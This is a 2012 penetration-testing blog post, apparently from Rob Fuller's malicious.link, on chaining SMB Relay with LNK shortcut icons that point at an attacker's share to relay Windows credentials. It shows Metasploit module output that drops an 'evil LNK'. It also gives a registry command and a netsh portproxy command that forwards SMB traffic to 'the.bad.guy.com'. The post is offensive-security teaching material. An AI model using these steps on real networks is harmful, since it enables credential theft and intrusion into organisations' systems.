@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>MS08_068 &#43; MS10_046 = FUN UNTIL 2018 - Malicious Link - Blog by mubix - Rob Fuller</title><meta name="Description" content="This is a cool blog"><meta property="og:title" content="MS08_068 &#43; MS10_046 = FUN UNTIL 2018" />
+<meta property="og:description" content="TL;DR: SMB Relay &#43; LNK UNC icons = internal pentest pwnage
+I need to touch on the highlights of two vulnerabilities before we talk about the fun stuff, but I highly encourage you to read the references at the bottom of this post and understand the vulnerabilities after you are done with my little trick, as you might find one of your own.
+MS08_068: http://www.cvedetails.com/cve/CVE-2008-4037/
+In 2008, Microsoft released MS08_068 which patched the &ldquo;SMB Relay&rdquo; attack." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://malicious.link/posts/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2012-02-11T08:29:37+00:00" />
+<meta property="article:modified_time" content="2012-02-11T08:29:37+00:00" /><meta property="og:site_name" content="My cool site" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="MS08_068 &#43; MS10_046 = FUN UNTIL 2018"/>
+<meta name="twitter:description" content="TL;DR: SMB Relay &#43; LNK UNC icons = internal pentest pwnage
+I need to touch on the highlights of two vulnerabilities before we talk about the fun stuff, but I highly encourage you to read the references at the bottom of this post and understand the vulnerabilities after you are done with my little trick, as you might find one of your own.
+MS08_068: http://www.cvedetails.com/cve/CVE-2008-4037/
+In 2008, Microsoft released MS08_068 which patched the &ldquo;SMB Relay&rdquo; attack."/>
+<meta name="application-name" content="malicious.link">
+<meta name="apple-mobile-web-app-title" content="malicious.link"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://malicious.link/posts/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/" /><link rel="prev" href="https://malicious.link/posts/2012/2012-02-03-a-textfiles-approach-at-gathering-the-worlds-dns-slides/" /><link rel="next" href="https://malicious.link/posts/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "MS08_068 + MS10_046 = FUN UNTIL 2018",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/malicious.link\/posts\/2012\/2012-02-11-ms08_068-ms10_046-fun-until-2018\/"
+        },"genre": "posts","wordcount":  937 ,
+        "url": "https:\/\/malicious.link\/posts\/2012\/2012-02-11-ms08_068-ms10_046-fun-until-2018\/","datePublished": "2012-02-11T08:29:37+00:00","dateModified": "2012-02-11T08:29:37+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "mubix"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/brandon"> Brandon </a><a class="menu-item" href="/categories"> Categories </a><a class="menu-item" href="/posts"> Posts </a><a class="menu-item" href="/start"> Start </a><a class="menu-item" href="/tags"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/brandon" title="">Brandon</a><a class="menu-item" href="/categories" title="">Categories</a><a class="menu-item" href="/posts" title="">Posts</a><a class="menu-item" href="/start" title="">Start</a><a class="menu-item" href="/tags" title="">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">MS08_068 + MS10_046 = FUN UNTIL 2018</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/mubix" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>mubix</a></span>&nbsp;<span class="post-category">included in <a href="/categories/lnk/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>lnk</a>&nbsp;<a href="/categories/metasploit/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>metasploit</a>&nbsp;<a href="/categories/smbrelay/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>smbrelay</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2012-02-11">2012-02-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;937 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#references">References:</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><strong><strong>TL;DR:</strong></strong> SMB Relay + LNK UNC icons = internal pentest pwnage</p>
+<p>I need to touch on the highlights of two vulnerabilities before we talk about the fun stuff, but I highly encourage you to read the references at the bottom of this post and understand the vulnerabilities after you are done with my little trick, as you might find one of your own.</p>
+<p><strong>MS08_068:</strong> <a href="http://www.cvedetails.com/cve/CVE-2008-4037/" target="_blank" rel="noopener noreffer ">http://www.cvedetails.com/cve/CVE-2008-4037/</a></p>
+<p>In 2008, Microsoft released MS08_068 which patched the &ldquo;SMB Relay&rdquo; attack. To boil this down, an attacker gets a victim to attempt to authenticate to an attacker controlled box. The attack delays its responses to the victim and replays the important parts of the authentication that the victim sent back at the victim. You can find out a lot more about this vulnerability here: <a href="https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay" target="_blank" rel="noopener noreffer ">https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay</a></p>
+<p>One thing to take away from that post is that the patch stops Attacker &lt;=&gt; Victim, but does not / cannot fix Victim &lt;=&gt; Attacker &lt;=&gt; <strong>Victim2</strong> (use authentication from Victim to replay to Victim2)</p>
+<p><strong>MS10_046:</strong> <a href="http://www.cvedetails.com/cve/CVE-2010-2568/" target="_blank" rel="noopener noreffer ">http://www.cvedetails.com/cve/CVE-2010-2568/</a></p>
+<p>In 2010, Microsoft released MS10_046 which patched the Stuxnet LNK vulnerability where a malicious DLL could be loaded (locally or remotely over WebDAV) using the path of the shortcut&rsquo;s icon reference. LNK files are Windows shortcut files that allow the icons of the files to be changed much more dynamically than any other file type (Right click a shortcut, go to Properties, and just simply click the &lsquo;Change Icon&rsquo; button). I could certainly be wrong here, but I believe all Microsoft patched was the ability to use this feature to load the DLLs via a certain Control Panel object. Which leaves the ability to load shortcut (LNK) icons from wherever we wish. ;-)</p>
+<p><strong>The Setup:</strong></p>
+<p>If you are on an internal penetration test and either exploit a machine or find an open share, you can create an LNK file with an icon that points at a nonexistent share on your attacking machine&rsquo;s IP and use SMB_Relay to replay those credentials to a system in which we&rsquo;ve identified by one means or another as an &lsquo;important&rsquo; host to get on.</p>
+<p>Attacker uploads malicious LNK file to network share on <strong>FILE SHARE</strong></p>
+<p>Victim views it on <strong>WORKSTATION</strong> that initiates an connection to <strong>ATTACKER</strong></p>
+<p>Attacker relays those authentication attempts to <strong>FILE SHARE</strong>, gaining code execution if &lsquo;Victim&rsquo; is an admin on <strong>FILE SHARE</strong></p>
+<p>If not, then NetNTLM are still visible in the logs and can be attempted to crack, or just wait for more people to view the LNK file on the public share, and hope that an admin comes by at some point.</p>
+<p>Your mileage will vary based on where you put the LNK file.</p>
+<p><strong>The Video:</strong></p>
+<center><iframe align=center width="560" height="315" src="//www.youtube.com/embed/FxekUPY5ojU" frameborder="0" allowfullscreen></iframe></center>
+<p>I have created a post module to automate the process of creating and uploading the LNK file (so you don&rsquo;t have to have a Windows box lying around). Here it is in action:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Module options (post/windows/escalate/droplnk):
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name          Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----          ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   ICONFILENAME  icon.png         yes       File name on LHOST&#39;s share
+</span></span><span class="line"><span class="cl">   LHOST         192.168.2.16     yes       Host listening for incoming SMB/WebDAV traffic
+</span></span><span class="line"><span class="cl">   LNKFILENAME   Words.lnk        yes       Shortcut&#39;s filename
+</span></span><span class="line"><span class="cl">   SESSION       1                yes       The session to run this module on.
+</span></span><span class="line"><span class="cl">   SHARENAME     share1           yes       Share name on LHOST
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2012-02-11 07:17:19 +0000 2 1 post(droplnk) &gt; run
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Creating evil LNK
+</span></span><span class="line"><span class="cl">[*] Done. Writing to disk - C:\DocuMe~1\Administrator\Words.lnk
+</span></span><span class="line"><span class="cl">[*] Done. Wait for evil to happen..
+</span></span><span class="line"><span class="cl">[*] Post module execution completed
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>You can find the code here:</p>
+<p><a href="https://github.com/mubix/Not-In-Pentesting-Class/blob/master/modules/post/mubix/droplnk.rb" target="_blank" rel="noopener noreffer ">https://github.com/mubix/Not-In-Pentesting-Class/blob/master/modules/post/mubix/droplnk.rb</a></p>
+<p><strong>Going forward:</strong></p>
+<p>Obviously this isn&rsquo;t so effective remotely out of the box and there currently isn&rsquo;t a SMB_Relay for WebDAV (although I&rsquo;m guessing that would work). However I was able to construct a crude way getting smb_relaying working using some pretty loud system changes to an exploited host:</p>
+<ul>
+<li><strong>Step 1</strong>: Disable SMB on Port 445 (it will still operate on 139 as it is a failover), this setting requires a reboot to take effect and can be done using the following command:
+<ul>
+<li><code>reg add HKLM\System\CurrentControlSet\Services\NetBTParameters /v SMBDeviceEnabled /t REG_DWORD /d 0</code></li>
+</ul>
+</li>
+<li><strong>Step 2</strong>: Port forward the traffic out to your remote attacker host over a port that is allowed out, used 80:
+<ul>
+<li><code>netsh int portproxy v4tov4 listenport=445 connectaddress=the.bad.guy.com connectport=80</code></li>
+</ul>
+</li>
+<li><strong>Step 3</strong>: Set up SMB_Relay listening on that port on your attacker with a route in meterpreter to send all relayed authentication through your meterpreter session into and at the targeted host.</li>
+</ul>
+<p>These steps can get you noticed in almost every way, so it&rsquo;s not recommended, I just did it as a PoC. I mean how cool is it to remotely exploit SMB vulns ;-)</p>
+<p>The other thing is, administrators are becoming much more rare as years move along and people use lower priv users for their daily tasks, so there are currently feature requests in to the Metasploit project to make it so when you get SMB_Relay correctly forwarding good credentials, even if they aren&rsquo;t admin and you cannot get code execution it would be nice to be able to go through the files that person has access to on the targeted system / file share. A final pipe dream of this post is to have a multi-threaded smb_relay that 2, 3 or even 10 servers can be targeted with the relayed authentication.</p>
+<p>just saying&rsquo;…. /me nudges the Metasploit devs…</p>
+<h3 id="references">References:</h3>
+<h4 id="smb_relay-references">SMB_Relay References:</h4>
+<ul>
+<li>&ldquo;Initial?&rdquo; release in 2003 - <a href="http://www.xfocus.net/articles/200305/smbrelay.html" target="_blank" rel="noopener noreffer ">http://www.xfocus.net/articles/200305/smbrelay.html</a></li>
+<li>Microsoft advisory - <a href="http://technet.microsoft.com/en-us/security/bulletin/ms08-068" target="_blank" rel="noopener noreffer ">http://technet.microsoft.com/en-us/security/bulletin/ms08-068</a></li>
+<li>Metasploit blog post - <a href="https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay" target="_blank" rel="noopener noreffer ">https://community.rapid7.com/community/solutions/metasploit/blog/2008/11/11/ms08-068-metasploit-and-smb-relay</a></li>
+<li>Metasploit module - <a href="http://www.metasploit.com/modules/exploit/windows/smb/smb_relay" target="_blank" rel="noopener noreffer ">http://www.metasploit.com/modules/exploit/windows/smb/smb_relay</a></li>
+</ul>
+<h4 id="lnk-dll-loader-references">LNK DLL Loader References:</h4>
+<ul>
+<li>Microsoft advisory - <a href="http://technet.microsoft.com/en-us/security/advisory/2286198" target="_blank" rel="noopener noreffer ">http://technet.microsoft.com/en-us/security/advisory/2286198</a></li>
+<li>Metasploit blog post - <a href="https://community.rapid7.com/community/infosec/blog/2010/08/05/ms10-046-a-rude-awakening" target="_blank" rel="noopener noreffer ">https://community.rapid7.com/community/infosec/blog/2010/08/05/ms10-046-a-rude-awakening</a></li>
+<li>Some of HDM&rsquo;s research - <a href="https://community.rapid7.com/community/solutions/metasploit/blog/2010/08/22/exploiting-dll-hijacking-flaws" target="_blank" rel="noopener noreffer ">https://community.rapid7.com/community/solutions/metasploit/blog/2010/08/22/exploiting-dll-hijacking-flaws</a></li>
+<li>ISS&rsquo;s advisory - <a href="http://blogs.iss.net/archive/remotedllpreloadingv.html" target="_blank" rel="noopener noreffer ">http://blogs.iss.net/archive/remotedllpreloadingv.html</a></li>
+<li>Metasploit module - <a href="http://www.metasploit.com/modules/exploit/windows/browser/ms10_046_shortcut_icon_dllloader" target="_blank" rel="noopener noreffer ">http://www.metasploit.com/modules/exploit/windows/browser/ms10_046_shortcut_icon_dllloader</a></li>
+<li>Video of the module in action - <a href="http://www.commonexploits.com/?p=151" target="_blank" rel="noopener noreffer ">http://www.commonexploits.com/?p=151</a></li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2012-02-11</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://malicious.link/posts/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/" data-title="MS08_068 &#43; MS10_046 = FUN UNTIL 2018" data-via="mubix"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://malicious.link/posts/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://malicious.link/posts/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://malicious.link/posts/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/" data-title="MS08_068 &#43; MS10_046 = FUN UNTIL 2018"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://malicious.link/posts/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://malicious.link/posts/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/" data-title="MS08_068 &#43; MS10_046 = FUN UNTIL 2018"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://malicious.link/posts/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/" data-title="MS08_068 &#43; MS10_046 = FUN UNTIL 2018"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="https://malicious.link/posts/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/" data-title="MS08_068 &#43; MS10_046 = FUN UNTIL 2018"><i class="fab fa-evernote fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2012/2012-02-03-a-textfiles-approach-at-gathering-the-worlds-dns-slides/" class="prev" rel="prev" title="A @textfiles approach at gathering the world&#39;s DNS - Slides"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>A @textfiles approach at gathering the world's DNS - Slides</a>
+            <a href="/posts/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/" class="next" rel="next" title="Developing the LNK Metasploit post module with Mona">Developing the LNK Metasploit post module with Mona<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2005 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/mubix" target="_blank">Rob Fuller</a></span>&nbsp;|&nbsp;<span class="license">All Rights Reserved</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
